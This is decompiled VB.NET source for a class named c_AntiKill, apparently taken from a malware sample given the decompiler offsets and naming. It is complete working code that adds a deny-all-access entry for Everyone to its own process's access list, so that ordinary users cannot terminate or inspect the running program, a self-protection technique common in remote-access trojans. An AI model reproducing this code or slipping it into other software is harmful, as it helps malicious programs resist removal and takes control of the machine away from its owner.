Imports System
Imports System.ComponentModel
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Principal

Namespace Main.Tools
	' Token: 0x02000030 RID: 48
	Friend Class c_AntiKill
		' Token: 0x06000115 RID: 277
		Private Declare Function GetKernelObjectSecurity Lib "advapi32.dll" (Handle As IntPtr, securityInformation As Integer, <Out()> pSecurityDescriptor As Byte(), nLength As UInteger, <System.Runtime.InteropServices.OutAttribute()> ByRef lpnLengthNeeded As UInteger) As Boolean

		' Token: 0x06000116 RID: 278
		Private Declare Function SetKernelObjectSecurity Lib "advapi32.dll" (Handle As IntPtr, securityInformation As Integer, <[In]()> pSecurityDescriptor As Byte()) As Boolean

		' Token: 0x06000117 RID: 279
		Private Declare Function GetCurrentProcess Lib "kernel32.dll" () As IntPtr

		' Token: 0x06000118 RID: 280 RVA: 0x0000AAE8 File Offset: 0x00008CE8
		Private Function GetProcessSecurityDescriptor(processHandle As IntPtr) As RawSecurityDescriptor
			Dim array As Byte() = New Byte(-1) {}
			Dim num As UInteger
			c_AntiKill.GetKernelObjectSecurity(processHandle, 4, array, 0UI, num)
			If CULng(num) > 32767UL Then
				Throw New Win32Exception()
			End If
			Dim num2 As Integer = 4
			Dim array2 As Byte() = New Byte(num - 1) {}
			array = array2
			If Not c_AntiKill.GetKernelObjectSecurity(processHandle, num2, array2, num, num) Then
				Throw New Win32Exception()
			End If
			Return New RawSecurityDescriptor(array, 0)
		End Function

		' Token: 0x06000119 RID: 281 RVA: 0x0000AB48 File Offset: 0x00008D48
		Private Sub SetProcessSecurityDescriptor(processHandle As IntPtr, dacl As RawSecurityDescriptor)
			Dim array As Byte() = New Byte(dacl.BinaryLength - 1) {}
			dacl.GetBinaryForm(array, 0)
			If Not c_AntiKill.SetKernelObjectSecurity(processHandle, 4, array) Then
				Throw New Win32Exception()
			End If
		End Sub

		' Token: 0x0600011A RID: 282 RVA: 0x0000AB7C File Offset: 0x00008D7C
		Public Sub c_ImAntiKill()
			Dim currentProcess As IntPtr = c_AntiKill.GetCurrentProcess()
			Dim processSecurityDescriptor As RawSecurityDescriptor = Me.GetProcessSecurityDescriptor(currentProcess)
			processSecurityDescriptor.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
			Me.SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor)
		End Sub
	End Class
End Namespace
